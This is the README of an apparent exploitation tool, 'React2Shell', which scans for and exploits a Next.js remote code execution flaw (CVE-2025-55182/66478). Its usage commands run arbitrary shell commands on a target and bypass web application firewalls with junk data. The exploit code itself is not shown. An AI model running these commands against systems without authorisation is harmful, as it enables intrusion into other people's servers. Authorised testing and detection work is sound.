# React2Shell

A scanner for detecting and exploiting **Next.js RCE** vulnerabilities (CVE-2025-55182 & CVE-2025-66478).

**Credits:** Based on original research and tooling by the [Assetnote Security Research Team](https://www.assetnote.io/resources/research).

## Installation

```bash
pip install -r requirements.txt
```

## Usage

### Basic Scan
Check if a target is vulnerable:
```bash
python3 react2shell.py -u https://target.com
```

### Custom Command Execution
Execute custom commands (e.g., `id`, `ls -la`) on the target.
> **Note:** Output is automatically Base64 encoded/decoded to handle newlines and special characters correctly.

```bash
python3 react2shell.py -u https://target.com --waf-bypass -c "ls -la"
```

### WAF Bypass
Add junk data to bypass WAF inspections:
```bash
python3 react2shell.py -u https://target.com --waf-bypass
```
